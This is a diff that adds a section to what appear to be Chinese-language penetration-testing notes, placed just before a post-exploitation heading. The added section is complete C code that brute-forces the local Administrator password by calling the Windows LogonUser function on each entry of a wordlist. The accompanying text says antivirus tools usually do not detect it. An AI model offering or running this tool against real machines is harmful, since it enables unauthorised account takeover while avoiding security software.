@@ -274,6 +274,40 @@ set KEY_PATH "C:\Users\Administrator\.ssh\id_rsa"
 run
 ```
 
+### 爆破密码的另一种方式（Windows API）
+
+其实直接用下面的代码调用`LogonUser`函数理论也可以本地爆破密码，杀软一般不报毒。
+
+```c
+#include <Windows.h>
+#include <tchar.h>
+#include <stdio.h>
+#define LENGTH 2000
+
+int main(){
+    HANDLE hUser;
+    int length = 0;
+    const char* USERNAME = "Administrator";
+    const char* PASSWORD_FILE = "password.txt";
+    char PASSWORD[LENGTH] = "";
+    freopen(PASSWORD_FILE, "r", stdin);
+    do {
+        length = strlen(PASSWORD);
+        if(PASSWORD[length - 1] == '\n') { PASSWORD[--length] = '\0'; }
+        if(PASSWORD[length - 1] == '\r') { PASSWORD[--length] = '\0'; }
+        if(LogonUser(_T(USERNAME), _T("."), _T((const char*)PASSWORD), LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, &hUser)) {
+             printf("%s\r\n%s\r\nlength: %d", USERNAME, PASSWORD, strlen(PASSWORD));
+             return 0;
+        }
+        else {
+             // MessageBoxA(NULL,"ERROR",NULL,0);
+        }
+    } while (fgets(PASSWORD, LENGTH, stdin));
+    printf("not found");
+    return 1;
+}
+```
+
 ## 后渗透
 
 ### 安全软件
